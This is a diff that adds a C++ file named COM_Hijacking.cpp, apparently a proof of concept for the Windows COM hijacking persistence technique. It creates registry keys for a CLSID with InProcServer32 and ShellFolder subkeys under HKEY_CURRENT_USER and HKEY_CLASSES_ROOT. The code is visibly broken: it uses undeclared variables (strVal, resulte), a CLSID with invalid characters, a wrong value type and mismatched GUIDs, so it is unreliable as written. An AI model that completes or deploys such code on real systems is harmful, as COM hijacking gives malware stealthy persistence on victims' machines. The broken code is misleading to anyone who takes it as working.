@@ -1,0 +1,65 @@
+
+// COM_Hijacking.cpp : 定义控制台应用程序的入口点。
+//
+
+#include "stdafx.h"
+#include <iostream>    
+#include<Windows.h>
+#include <algorithm>    
+#include <cmath>    
+#include <vector>    
+#include <string>    
+#include <cstring>  
+#include<winreg.h>
+using namespace std;
+
+void OnBnClickedChange(char*name)//
+{
+	HKEY hKey = NULL;
+	TCHAR * subKey = _T("Software\\Classes\\{00000000-0W0B-0G0L-0I0L-520131400000}");
+	TCHAR * subKey2 = _T("Software\\Classes\\{00000000-0W0B-0G0L-0I0L-520131400000}\\InProcServer32");
+	TCHAR * subKey3 = _T("Software\\Classes\\{00000000-0W0B-0G0L-0I0L-520131400000}\\ShellFolder");
+	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
+	DWORD dwDisposition;
+	
+	RegCreateKeyEx(HKEY_CURRENT_USER, subKey, 0, NULL,
+		dwOptions, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, NULL, &dwDisposition);
+		
+	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey2, 0, NULL,
+		dwOptions, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hKey, &dwDisposition);
+	RegSetValueEx(hKey, NULL,0, REG_SZ, (BYTE*)strVal,7);
+	RegSetValueEx(hKey, _T("ThreadingModel"),0, REG_SZ, (BYTE*)strVal,7);
+	
+	
+	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey3, 0, NULL,
+		dwOptions, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hKey, &dwDisposition);
+	RegSetValueEx(hKey, _T("Attributes"),0, DWORD, (BYTE*)strVal,7);
+	
+	
+	if (resulte != ERROR_SUCCESS)
+	{
+		MessageBox(NULL, _T("打开注册表失败"), _T("提示"), MB_OK);
+	}
+	else
+	{
+		if (dwDisposition == REG_OPENED_EXISTING_KEY)
+		{
+			MessageBox(NULL, _T("打开一个存在的注册表项"), _T("提示"), MB_OK);
+		}
+		else if (dwDisposition == REG_CREATED_NEW_KEY)
+		{
+			MessageBox(NULL, _T("新建一个注册表项"), _T("提示"), MB_OK);
+		}
+	}
+	RegCloseKey(hKey);
+}
+
+int main(int argc, char*argv[])
+{
+	if (argc == 1) {
+		OnBnClickedChange("{00000000-0W0B-0G0L-0I0L-521131400000}");
+		exit(0);
+	}
+	return 0;
+}
+
